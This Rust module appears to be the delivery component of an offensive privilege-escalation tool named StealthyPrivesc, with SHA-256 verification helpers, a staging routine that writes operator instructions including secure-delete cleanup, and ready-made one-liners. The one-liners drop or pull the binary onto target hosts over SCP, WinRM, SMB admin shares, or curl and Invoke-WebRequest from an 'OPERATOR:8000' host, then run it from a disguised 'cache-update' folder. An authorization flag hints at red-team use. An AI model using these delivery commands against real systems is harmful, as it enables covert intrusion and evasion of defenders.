//! Operator delivery kit: stage, verify, one-liners.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

use anyhow::{bail, Context, Result};
use sha2::{Digest, Sha256};

use crate::core::artifacts::{self, ArtifactLedger};

pub fn sha256_file(path: &Path) -> Result<String> {
    let data = fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&data);
    Ok(hex::encode(hasher.finalize()))
}

pub fn verify_local(path: &Path, expect_sha256: &str) -> Result<()> {
    let got = sha256_file(path)?;
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!(
            "hash mismatch for {}: expected {}, got {}",
            path.display(),
            expect,
            got
        );
    }
    Ok(())
}

pub fn verify_ssh(ssh_target: &str, remote_path: &str, expect_sha256: &str) -> Result<()> {
    let output = Command::new("ssh")
        .args([
            ssh_target,
            &format!("sha256sum '{remote_path}' || shasum -a 256 '{remote_path}'"),
        ])
        .output()
        .context("spawn ssh for remote verify")?;
    if !output.status.success() {
        bail!(
            "remote hash failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let got = stdout
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!("remote hash mismatch: expected {expect}, got {got}");
    }
    Ok(())
}

pub struct StageOptions<'a> {
    pub os: &'a str,
    pub arch: &'a str,
    pub name: &'a str,
    pub out_dir: &'a Path,
    pub binary: Option<&'a Path>,
    pub run_id: &'a str,
    pub ledger_dir: &'a Path,
}

pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
    fs::create_dir_all(opts.out_dir)?;
    let bin_name = if opts.os == "windows" {
        format!("{}.exe", opts.name)
    } else {
        opts.name.to_string()
    };
    let dest_bin = opts.out_dir.join(&bin_name);

    if let Some(src) = opts.binary {
        fs::copy(src, &dest_bin)
            .with_context(|| format!("copy {} -> {}", src.display(), dest_bin.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&dest_bin)?.permissions();
            perms.set_mode(0o750);
            fs::set_permissions(&dest_bin, perms)?;
        }
    } else {
        // Placeholder notice when no binary provided.
        let mut f = fs::File::create(&dest_bin)?;
        writeln!(
            f,
            "PLACEHOLDER: pass --binary PATH to stage a real stealthy artifact for {}/{}",
            opts.os, opts.arch
        )?;
    }

    // Copy script fallbacks when present relative to cwd.
    let scripts_src = if opts.os == "windows" {
        PathBuf::from("scripts/windows")
    } else {
        PathBuf::from("scripts/linux")
    };
    let scripts_dst = opts.out_dir.join("scripts");
    if scripts_src.is_dir() {
        copy_dir_recursive(&scripts_src, &scripts_dst)?;
    }

    let hash = if dest_bin.is_file() {
        sha256_file(&dest_bin).unwrap_or_else(|_| "unavailable".into())
    } else {
        "unavailable".into()
    };
    fs::write(
        opts.out_dir.join("SHA256SUMS"),
        format!("{hash}  {bin_name}\n"),
    )?;

    let operator = format!(
        "StealthyPrivesc stage bundle\n\
         os={} arch={} name={}\n\
         binary_sha256={}\n\n\
         Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
         Enumerate:\n  STEALTHY_AUTHORIZED=1 ./{bin_name} --profile balanced enum\n\n\
         Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
        opts.os, opts.arch, opts.name, hash
    );
    fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;

    let mut ledger = ArtifactLedger::new(opts.run_id);
    ledger.register("stage_bundle", opts.out_dir, true, "staged delivery bundle");
    ledger.register("binary_drop", &dest_bin, true, "staged binary");
    ledger.register(
        "stage_bundle",
        opts.out_dir.join("SHA256SUMS"),
        true,
        "checksums",
    );
    artifacts::save_ledger(opts.ledger_dir, &ledger)?;
    Ok(opts.out_dir.to_path_buf())
}

fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<()> {
    fs::create_dir_all(dst)?;
    for ent in fs::read_dir(src)? {
        let ent = ent?;
        let ty = ent.file_type()?;
        let to = dst.join(ent.file_name());
        if ty.is_dir() {
            copy_dir_recursive(&ent.path(), &to)?;
        } else if ty.is_file() {
            fs::copy(ent.path(), &to)?;
        }
    }
    Ok(())
}

pub fn one_liners(os: &str, transport: &str) -> String {
    match (os, transport) {
        ("linux", "ssh") | ("linux", "scp") => r#"# SCP drop + enum
scp target/release/stealthy user@host:/tmp/cache-update/stealthy
ssh user@host 'chmod 750 /tmp/cache-update/stealthy && STEALTHY_AUTHORIZED=1 /tmp/cache-update/stealthy --profile quiet enum'
"#.into(),
        ("linux", "http") => r#"# HTTP pull on target
curl -fsSL http://OPERATOR:8000/stealthy -o /tmp/cache-update/stealthy
chmod 750 /tmp/cache-update/stealthy
STEALTHY_AUTHORIZED=1 /tmp/cache-update/stealthy doctor
"#.into(),
        ("windows", "winrm") => r#"# WinRM copy + run
Copy-Item .\stealthy.exe \\HOST\C$\Users\Public\Documents\cache-update\stealthy.exe
Invoke-Command -ComputerName HOST -ScriptBlock {
  $env:STEALTHY_AUTHORIZED='1'
  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' --profile quiet enum
}
"#.into(),
        ("windows", "smb") => r#"# SMB admin share drop
$Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\stealthy.exe "$Dir\stealthy.exe"
"#.into(),
        ("windows", "http") => r#"# HTTP pull on Windows
Invoke-WebRequest -Uri http://OPERATOR:8000/stealthy.exe -OutFile $env:TEMP\stealthy.exe
$env:STEALTHY_AUTHORIZED='1'
& $env:TEMP\stealthy.exe doctor
"#.into(),
        ("linux", "smb") => r#"# Copy from mounted engagement share
cp /mnt/engagement-share/stealthy /tmp/cache-update/stealthy
chmod 750 /tmp/cache-update/stealthy
"#.into(),
        _ => format!(
            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(winrm|smb|http)\n"
        ),
    }
}
